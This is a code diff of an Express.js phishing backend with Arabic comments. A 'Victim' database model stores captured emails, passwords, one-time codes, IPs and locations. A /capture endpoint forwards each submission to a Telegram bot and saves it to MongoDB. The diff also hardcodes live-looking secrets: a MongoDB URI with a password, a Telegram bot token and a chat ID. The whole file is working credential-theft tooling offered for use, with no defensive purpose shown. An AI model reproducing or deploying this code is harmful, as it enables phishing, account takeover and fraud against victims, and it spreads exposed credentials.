@@ -1,4 +1,3 @@
-require('dotenv').config();
 const express = require('express');
 const mongoose = require('mongoose');
 const bodyParser = require('body-parser');
@@ -13,41 +12,36 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
-// استدعاء البيانات الحساسة من البيئة المحيطة
-const MONGO_URI = process.env.MONGO_URI;
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+// وضع البيانات مباشرة هنا (Hardcoded)
+const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
+const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
+const CHAT_ID = "8351043975";
 
-// الاتصال بقاعدة البيانات مع معالجة الأخطاء
+// الاتصال بقاعدة البيانات
 mongoose.connect(MONGO_URI)
-    .then(() => console.log("✅ Connected to MongoDB Securely"))
-    .catch(e => console.log("❌ DB connection error:", e.message));
+    .then(() => console.log("✅ Connected to MongoDB"))
+    .catch(e => console.log("❌ DB Error:", e.message));
 
-// تعريف نموذج البيانات (Schema)
+// تعريف النموذج
 const Victim = mongoose.model('Victim', new mongoose.Schema({
     email: String, 
     password: String, 
     otp: String, 
     device: String, 
-    ip: String, // أضفنا حقل الـ IP
+    ip: String,
     location: Object,
-    timestamp: { type: Date, default: Date.now } // أضفنا وقت وصول البيانات
+    timestamp: { type: Date, default: Date.now }
 }));
 
-// تقديم الصفحة الرئيسية
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// استقبال البيانات
 app.post('/capture', async (req, res) => {
     const data = req.body;
-    
-    // جلب الـ IP الحقيقي للزائر خلف بروكسي Render
     const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
     try {
-        // تنسيق رسالة التليجرام بشكل أوضح
         let msg = `🚀 **إشعار جديد**\n`;
         msg += `━━━━━━━━━━━━━━\n`;
         msg += `📧 **الحساب:** \`${data.email}\` \n`;
@@ -60,23 +54,21 @@ app.post('/capture', async (req, res) => {
         }
         msg += `\n━━━━━━━━━━━━━━`;
         
-        // إرسال البيانات للتليجرام
+        // إرسال للتليجرام
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: msg,
             parse_mode: 'Markdown'
         });
+        console.log("✅ Message sent to Telegram");
     } catch (e) { 
-        console.log("❌ Telegram Error:", e.message); 
+        console.log("❌ Telegram Error:", e.response ? e.response.data : e.message); 
     }
 
     try {
-        // حفظ البيانات في MongoDB مع الـ IP والوقت
-        const entry = new Victim({
-            ...data,
-            ip: visitorIp
-        });
+        const entry = new Victim({ ...data, ip: visitorIp });
         await entry.save();
+        console.log("✅ Data saved to DB");
     } catch (e) { 
         console.log("❌ DB Save Error");
     }
@@ -84,6 +76,5 @@ app.post('/capture', async (req, res) => {
     res.status(200).send("OK");
 });
 
-// تحديد المنفذ (Render يفضل استخدام المتغير البيئي PORT)
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
